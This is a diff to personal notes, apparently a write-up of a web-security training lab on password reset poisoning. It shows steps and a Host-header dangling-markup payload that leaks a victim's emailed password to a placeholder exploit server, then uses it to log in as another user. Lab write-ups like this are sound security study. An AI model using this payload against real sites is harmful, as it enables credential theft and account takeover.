@@ -248,7 +248,31 @@ You can log in to your own account using the following credentials: `wiener:pet
 4.  In the email client, check the raw version of your emails. Notice that your injected port is reflected inside a link as an unescaped, single-quoted string. This is later followed by the new password. Send the `POST /forgot-password` request again, but this time use the port to break out of the string and inject a dangling-markup payload pointing to your exploit server:
     ![](Pasted%20image%2020250315163915.png)
     ![](Pasted%20image%2020250315170346.png)
+    
+5. Check the email client. You should have received a new email in which most of the content is missing. Go to the exploit server and check the access log. Notice that there is an entry for a request that begins `GET /?/login'>[…]`, which contains the rest of the email body, including the new password.
     ![](Pasted%20image%2020250315170423.png)
     ![](Pasted%20image%2020250315170505.png)
     ![](Pasted%20image%2020250315170556.png)
+6. In Burp Repeater, send the request one last time, but change the `username` parameter to `carlos`. Refresh the access log and obtain Carlos's new password from the corresponding log entry. Log in as `carlos` using this new password to solve the lab.
 
+## Dangling markup technique explained
+The vulnerability exploits the way user-controlled input (specifically the Host header) is reflected unsanitized in password reset emails. The application:
+1. Includes the Host header value in the password reset email's HTML
+2. Does not properly sanitize this input in the raw HTML view
+3. Uses single quotes around URLs that can be escaped
+4. Sends new passwords directly in emails rather than using reset tokens
+
+The "**dangling markup**" technique works by:
+1. Injecting an incomplete HTML tag (`<a href="//`)
+2. Forcing the browser to interpret everything that follows as part of the URL attribute
+3. Making the browser send that content to an attacker-controlled server
+
+**Payload Injection**:
+- You craft a malicious port value to break out of the quotes and inject HTML:
+    `Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?`
+- This creates dangling markup where:
+    - `:'` closes the original string
+    - `<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?` starts a new anchor tag pointing to your server
+    - Everything following (including the password) becomes part of the URL
+
+When the email client processes this HTML, it sends a request to your exploit server. The request contains all text after your injection until the next closing quote, including the password
